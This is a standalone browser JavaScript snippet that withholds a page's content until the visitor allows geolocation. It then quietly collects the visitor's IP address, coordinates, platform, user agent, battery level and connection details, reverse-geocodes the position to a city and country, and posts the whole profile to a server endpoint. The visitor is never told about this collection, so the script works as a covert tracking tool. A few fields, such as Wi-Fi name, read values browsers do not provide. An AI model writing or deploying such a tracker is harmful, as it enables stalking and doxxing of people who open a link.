(function() {
    const ipifyAPI = 'https://api.ipify.org?format=json';
    const geocodeAPI = 'https://geocode.xyz/';
    const locationEndpoint = '/location';

    const permissionMessage = document.getElementById('permission-message');
    const content = document.getElementById('content');

    function displayContent() {
        content.style.display = 'block';
        permissionMessage.style.display = 'none';
    }

    function displayPermissionMessage() {
        content.style.display = 'none';
        permissionMessage.style.display = 'block';
    }

    if (navigator.geolocation) {
        fetch(ipifyAPI)
            .then(response => response.json())
            .then(ipData => {
                const ipAddress = ipData.ip;
                console.log('IP Address:', ipAddress);

                navigator.geolocation.getCurrentPosition(position => {
                    displayContent();

                    const coordinates = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        timestamp: position.timestamp
                    };

                    const deviceData = {
                        deviceName: navigator.platform,
                        deviceModel: navigator.userAgent,
                        batteryPercentage: null,
                        networkName: null,
                        wifiName: null,
                        wifiHost: null,
                        city: null,
                        state: null,
                        country: null,
                        ipAddress: ipAddress
                    };

                    navigator.getBattery().then(battery => {
                        deviceData.batteryPercentage = Math.round(battery.level * 100);
                        deviceData.networkName = battery.charging ? 'Charging' : 'Not charging';
                    });

                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    if (connection) {
                        deviceData.networkName = connection.type;
                        deviceData.wifiName = connection.ssid || null;
                        deviceData.wifiHost = connection.wifiHostname || null;
                    }

                    fetch(`${geocodeAPI}${coordinates.latitude},${coordinates.longitude}?json=1`)
                        .then(response => {
                            if (!response.ok) throw new Error('Error getting location data');
                            return response.json();
                        })
                        .then(locationData => {
                            deviceData.city = locationData.city;
                            deviceData.state = locationData.state;
                            deviceData.country = locationData.country;

                            const locationDetails = { ...coordinates, ...deviceData };
                            fetch(locationEndpoint, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(locationDetails)
                            }).then(result => {
                                if (result.ok) {
                                    console.log('Location data sent successfully');
                                } else {
                                    console.error('Failed to send location data');
                                }
                            });
                        })
                        .catch(error => {
                            console.error('Error getting location data', error);
                        });
                }, error => {
                    displayPermissionMessage();
                    console.error('Geolocation error', error);
                });
            })
            .catch(error => console.log(error));
    } else {
        displayPermissionMessage();
        console.error('Geolocation is not supported by this browser.');
    }
})();
